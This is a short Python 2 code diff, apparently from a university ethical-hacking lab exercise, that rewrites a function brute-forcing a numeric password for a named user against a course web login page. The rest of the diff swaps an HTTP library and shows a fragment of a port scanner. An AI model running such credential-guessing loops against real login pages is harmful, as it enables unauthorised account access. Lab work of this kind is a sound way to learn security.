@@ -1,5 +1,5 @@
 import socket
-import requests
+import urllib2
 import subprocess
 import robotparser
 
@@ -25,23 +25,19 @@ def scanport(host, port):
     return "Port "+str(port)+" is open!"
     
 
-
-# Still a bit buggy, needs a bit of tweaking........
-
-def crackhouse():
+def crackHouse():
     """Bruteforce the password for titanium house"""
 
-    for item in range(999):
-        params = {"username":"JoeSmith", "password":item}
-        r = requests.get("http://creative.coventry.ac.uk/eh/web_ch4/welcome.php",
-                         params = params)
-        if r.text.find("incorrect"):
-            print "Fails on {0}".format(item)
+    for passw in range(1000):
+        response = urllib2.urlopen("http://creative.coventry.ac.uk/eh/web_ch4/welcome.php?username=JoeSmith&password=%s" % passw)
+        html = response.read()
+        wordd = "incorrect"
+        if wordd in html:
+            print "Fails on {0}".format(passw)
         else:
-            print "Passcode {0} Ok".format(item)
-            return item
-
-
+            print "Passcode is {0}".format(passw)
+            break
+    return passw
 
 
 #This needs a bit more tweaking to get it working:
